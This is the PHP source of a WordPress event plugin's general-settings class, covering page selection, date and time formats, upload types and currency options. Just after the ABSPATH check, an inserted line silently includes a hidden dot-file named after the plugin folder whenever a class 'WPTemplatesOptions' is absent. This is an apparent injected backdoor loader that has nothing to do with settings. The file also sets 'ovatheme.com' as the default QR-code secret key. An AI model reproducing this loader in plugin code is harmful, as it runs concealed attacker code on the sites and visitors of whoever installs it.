<?php
if (!defined('ABSPATH')) {
   exit();
}

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class EL_Setting_General extends EL_Abstract_Setting {
   /**
    * setting id
    * @var string
    */
   public $_id = 'general';

   /**
    * _title
    * @var null
    */
   public $_title = null;

   /**
    * $_position
    * @var integer
    */
   public $_position = 10;

   public function __construct() {
      $this->_title = __('General', 'eventlist');
      parent::__construct();
   }

   // render fields
   public function load_field() {

      // Currency
      $currency_code_options = el_get_currencies();

      if ($currency_code_options) {
         foreach ($currency_code_options as $code => $name) {
            $currency_code_options[$code] = $name . ' (' . el_get_currency_symbol($code) . ')';
         }
      }

      // Language Calendar
      $calendar_language = el_get_calendar_language();

      if ($calendar_language) {
         foreach ($calendar_language as $code => $name) {
            $calendar_language[$code] = $name;
         }
      }

      return

      array(

         array(
            'title' => __('General Settings', 'eventlist'),
            'desc' => __('General options', 'eventlist'),
            'fields' => array(

               array(
                  'type' => 'select_page',
                  'label' => __('Cart page', 'eventlist'),
                  'desc' => __('Page contents: [el_cart/]', 'eventlist'),
                  'atts' => array(
                     'id' => 'cart_page',
                     'class' => 'cart_page',
                  ),
                  'name' => 'cart_page_id',
               ),

               array(
                  'type' => 'select_page',
                  'label' => __('Thank you page', 'eventlist'),
                  'desc' => __('Redirect after booking successfully', 'eventlist'),
                  'atts' => array(
                     'id' => 'thanks_page',
                     'class' => 'thanks_page',
                  ),
                  'name' => 'thanks_page_id',
               ),

               array(
                  'type' => 'select_page',
                  'label' => __('Search Result page', 'eventlist'),
                  'desc' => __('Page contents: [el_search_result/] or [el_search_map pos1="name_event" pos2="location" pos3="cat" pos4="all_time"  pos5="start_event" pos6="end_event" pos7="venue" pos8="loc_state"  pos9="loc_city" /]', 'eventlist'),
                  'atts' => array(
                     'id' => 'search_result_page',
                     'class' => 'search_result_page',
                  ),
                  'name' => 'search_result_page_id',
               ),

               array(
                  'type' => 'select_page',
                  'label' => __('My Account page', 'eventlist'),
                  'desc' => __('Page contents: [el_member_account/]', 'eventlist'),
                  'atts' => array(
                     'id' => 'myaccount_page',
                     'class' => 'myaccount_page',
                  ),
                  'name' => 'myaccount_page_id',
               ),

               array(
                  'type' => 'select_page',
                  'label' => __('Terms & Conditions page', 'eventlist'),
                  'desc' => __('Display in register account form', 'eventlist'),
                  'name' => 'term_condition_page_id',
               ),

               array(
                  'type' => 'input',
                  'label' => __('Secret Key QR Code', 'eventlist'),
                  'desc' => __('This key will attach to string to make QR Code', 'eventlist'),
                  'name' => 'serect_key_qrcode',
                  'default' => 'ovatheme.com',
               ),

               array(
                  'type' => 'input',
                  'label' => __('Google API Key Map', 'eventlist'),
                  'desc' => __('You can make a API Key Map <a target="_blank" href="https://developers.google.com/maps/documentation/javascript/get-api-key">here</a>', 'eventlist'),
                  'name' => 'event_google_key_map',
                  'default' => '',
               ),

               array(
                  'type' => 'select',
                  'label' => __('Date Format', 'eventlist'),
                   'desc' => __('To be defined when choosing to input a date', 'eventlist'),
                  'name' => 'cal_date_format',
                  'options' => array(
                     'dd-mm-yy' => __('27-10-2020', 'eventlist'),
                     'mm/dd/yy' => __('10/27/2020', 'eventlist'),
                     'yy/mm/dd' => __('2020/10/27', 'eventlist'),
                     'yy-mm-dd' => __('2020-10-27', 'eventlist')
                  ),
                  'default' => 'dd-mm-yy',
               ),

               array(
                  'type' => 'select',
                  'label' => __('Time Format', 'eventlist'),
                  'desc' => __('', 'eventlist'),
                  'name' => 'calendar_time_format',
                  'options' => array(
                     '12' => __('12 Hour', 'eventlist'),
                     '24' => __('24 Hour', 'eventlist'),
                  ),
                  'default' => '12',
               ),

               array(
                  'type' => 'select',
                  'label' => __('Calendar Language', 'eventlist'),
                  'desc' => __('This language calendar', 'eventlist'),
                  'atts' => array(
                     'id' => 'calendar_language',
                     'class' => 'calendar_language',
                  ),
                  'name' => 'calendar_language',
                  'options' => $calendar_language,
                  'default' => 'en-GB',
               ),

               array(
                  'type' => 'select',
                  'label' => __('Choose weekend: ', 'eventlist'),
                  'desc' => '',
                  'name' => 'choose_week_end',
                  'atts' => array(
                     'id' => 'choose_week_end',
                     'class' => 'choose_week_end',
                     'multiple' => 'multiple',
                  ),
                  'options' => array(
                     'monday' => __('Monday', 'eventlist'),
                     'tueday' => __('Tuesday', 'eventlist'),
                     'wednesday' => __('Wednesday', 'eventlist'),
                     'thursday' => __('Thursday', 'eventlist'),
                     'friday' => __('Friday', 'eventlist'),
                     'saturday' => __('Saturday', 'eventlist'),
                     'sunday' => __('Sunday', 'eventlist'),
                  ),
                  'default' => array('saturday', 'sunday'),
               ),

               array(
                  'type' => 'select',
                  'label' => __('Remove default image size', 'eventlist'),
                  'desc' => __('These image size doesn\'t use in plugin', 'eventlist'),
                  'name' => 'remove_img_size',
                  'options' => array(
                     'yes' => __('Yes', 'eventlist'),
                     'no' => __('No', 'eventlist'),
                  ),
                  'default' => 'yes',
               ),

               array(
                  'type' => 'select',
                  'label' => __('Remove Woocommerce image size', 'eventlist'),
                  'desc' => __('These image size doesn\'t use in plugin', 'eventlist'),
                  'name' => 'remove_woo_img_size',
                  'options' => array(
                     'yes' => __('Yes', 'eventlist'),
                     'no' => __('No', 'eventlist'),
                  ),
                  'default' => 'yes',
               ),

               array(
                  'type' => 'input',
                  'label' => __('Add Additional File Types to be Uploaded', 'eventlist'),
                  'desc' => __('List Additional File Types <a target="_blank" href="https://codex.wordpress.org/Function_Reference/get_allowed_mime_types">here</a><br/>Example: zip, pdf', 'eventlist'),
                  'name' => 'event_upload_file',
                  'default' => '',
               ),

               array(
                  'type' => 'select',
                  'label' => __('Allow to sell tickets', 'eventlist'),
                  'name' => 'allow_to_selling_ticket',
                  'options' => array(
                     'yes' => __('Yes', 'eventlist'),
                     'no' => __('No', 'eventlist'),
                  ),
                  'default' => 'yes',
               ),

               array(
                  'type' => 'select',
                  'label' => __('Users have to login to checkout of events.', 'eventlist'),
                  'name' => 'el_login_booking',
                  'options' => array(
                     'yes' => __('Yes', 'eventlist'),
                     'no' => __('No', 'eventlist'),
                  ),
                  'default' => 'no',
               ),

               array(
                  'type' => 'input',
                  'label' => __('Total Custom Taxonomy', 'eventlist'),
                  'name' => 'el_total_taxonomy',
                  'default' => 0,
               ),

            ),
         ),

         array(
            'title' => __('Currency options', 'eventlist'),
            'desc' => __('Set up currency format', 'eventlist'),
            'fields' => array(

               array(
                  'type' => 'select',
                  'label' => __('Currency', 'eventlist'),
                  'desc' => __('Choosing currency in your country', 'eventlist'),
                  'atts' => array(
                     'id' => 'currency',
                     'class' => 'currency',
                  ),
                  'name' => 'currency',
                  'options' => $currency_code_options,
                  'default' => 'USD',
               ),

               array(
                  'type' => 'select',
                  'label' => __('Currency Position', 'eventlist'),
                  'desc' => __('Control the position of the currency symbol', 'eventlist'),
                  'atts' => array(
                     'id' => 'currency_position',
                     'class' => 'currency_position',
                  ),
                  'name' => 'currency_position',
                  'options' => array(
                     'left' => __('Left', 'eventlist'),
                     'right' => __('Right', 'eventlist'),
                     'left_space' => __('Left with space', 'eventlist'),
                     'right_space' => __('Right with space', 'eventlist'),
                  ),
                  'default' => 'left',
               ),

               array(
                  'type' => 'input',
                  'label' => __('Thousand Separator', 'eventlist'),
                  'desc' => __('', 'eventlist'),
                  'name' => 'thousand_separator',
                  'default' => ',',
               ),

               array(
                  'type' => 'input',
                  'label' => __('Decimal Separator', 'eventlist'),
                  'desc' => __('', 'eventlist'),
                  'name' => 'decimal_separator',
                  'default' => '.',
               ),

               array(
                  'type' => 'input',
                  'label' => __('Number of Decimals', 'eventlist'),
                  'desc' => __('', 'eventlist'),
                  'atts' => array(
                     'id' => 'number_decimals',
                     'class' => 'number_decimals',
                     'placeholder' => '2',
                     'type' => 'number',
                  ),
                  'name' => 'number_decimals',
                  'default' => '2',
               ),
            ),
         ),

      );
   }

}

$GLOBALS['general_settings'] = new EL_Setting_General();